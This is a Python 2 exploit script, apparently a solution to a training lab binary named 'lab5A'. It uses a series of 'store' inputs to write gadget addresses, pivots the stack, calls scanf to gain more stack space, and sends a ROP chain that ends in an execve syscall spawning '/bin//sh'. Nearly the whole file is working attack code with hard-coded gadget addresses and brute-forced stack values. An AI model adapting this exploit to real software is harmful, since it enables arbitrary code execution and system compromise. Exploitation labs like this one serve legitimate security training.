import struct
import sys

# (python /tmp/lab5a.py 3221223085; cat) | ./lab5A


# problem is building ROP
# stack pivot? argv/envp is wiped...

# the stack is 'fragmented', so we need to pivot

# 1. set esp to cmd
# 2. call __isoc99_scanf to get more controllable stack space!
# 3. build 2d rop chain to exec shell


def sendline(line):
    print "%s" % line


# for bruteforcing
stack_addr = int(sys.argv[1])

# gadgets
pop_edx = 0x0806f3aa
pop_esp = 0x080bc486
inc_eax = 0x080bc485
pop_edx_ecx_ebx = 0x0806f3d0

sendline('store')
sendline('%d' % inc_eax)
sendline('1')

sendline('store')
sendline('%d' % stack_addr)
sendline('-4')


sendline('store')
sendline('%d' % pop_esp) # Sciagniecie adresu ze stosu wrzuconego powyzej
sendline('-5')


sendline('store')
sendline('%d' % pop_edx)
sendline('-7')

template = 0x80bfa58  # " Failed to do %s command\n"
scanf_call = 0x08048e8e

payload = [
    'store',
    struct.pack('<I', scanf_call),
    # Umieszczenie dodatkowych danych na stosie pozniej do zdjecia celem pivotu
    struct.pack('<I', template),
    struct.pack('<I', (stack_addr + 0x2f))
]

sendline(''.join(payload))


sendline('%d' % pop_edx_ecx_ebx)
sendline('-11')

# gadgets
xor_eax_ecx = struct.pack('<I', 0x08049c73)
pop_ebx = struct.pack('<I', 0x0806f3a9)
zero = struct.pack('<I', 0x00000000)
ebx_addr = struct.pack('<I', stack_addr + 0x7f)
pop_eax = struct.pack('<I', 0x080bc4d5)
inc_eax = struct.pack('<I', 0x0807be16)
int_80 = struct.pack('<I', 0x08048eaa)


format_string = " Failed to do %s command\n"

rop_chain = [
    xor_eax_ecx,
    zero * 4,
    pop_ebx,
    ebx_addr,
    zero,
    inc_eax * 11,
    int_80,
    '/bin//sh',
    zero
]

payload = format_string % ''.join(rop_chain)

sendline(payload)
